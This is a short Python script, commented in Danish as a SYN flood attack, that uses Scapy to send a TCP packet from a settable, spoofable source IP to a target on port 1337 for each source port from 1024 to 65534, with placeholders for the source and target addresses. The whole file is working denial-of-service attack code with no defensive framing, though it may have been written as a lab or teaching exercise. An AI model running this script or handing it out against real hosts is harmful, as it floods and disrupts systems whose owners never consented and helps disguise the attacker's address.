#Syn Flood angreb med Scapy
from scapy.all import *
def synFlood(src, tgt):
	for sport in range (1024, 65535):
		L3 = IP(src=src, dst=tgt)
		L4 = TCP(sport=sport , dport=1337)
		pkt = L3/L4
		send(pkt)

src = "Insert_Source_Here"
tgt = "Insert_Target_Here"
synFlood(src, tgt)
